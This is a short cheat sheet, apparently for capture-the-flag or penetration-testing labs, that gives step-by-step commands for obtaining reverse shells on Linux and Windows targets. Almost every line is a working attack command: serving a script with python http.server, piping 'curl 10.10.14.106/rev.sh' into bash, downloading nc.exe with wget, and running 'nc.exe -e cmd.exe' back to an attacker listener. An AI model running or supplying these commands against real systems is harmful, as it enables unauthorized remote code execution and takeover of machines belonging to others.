## Linux
run server and expose rev.sh as file:
```
python3 -m http.server 80
```

on local machine call:
```
nc -lnvp 1337
```

on remote machine call:
```
curl 10.10.14.106/rev.sh|bash
```

- upgrade shell to bash:
```
python -c 'import pty; pty.spawn("/bin/bash")'
```

- to make if fully interactive:
```
https://gist.github.com/oscar-rk/f27464d7ab0c1fac4adf383b8a3527d3
```

## Windows
get nc.exe:
```bash
sudo apt install windows-binaries
```

run server and expose rev.sh as file:
```bash
python3 -m http.server 80
```

on local machine call:
```bash
nc -lnvp 1337
```

on remote machine in a directory where allowed to write:
```bash
wget http://10.10.14.9/nc.exe -outfile nc64.exe
.\nc.exe -e cmd.exe 10.10.14.9 1337
```
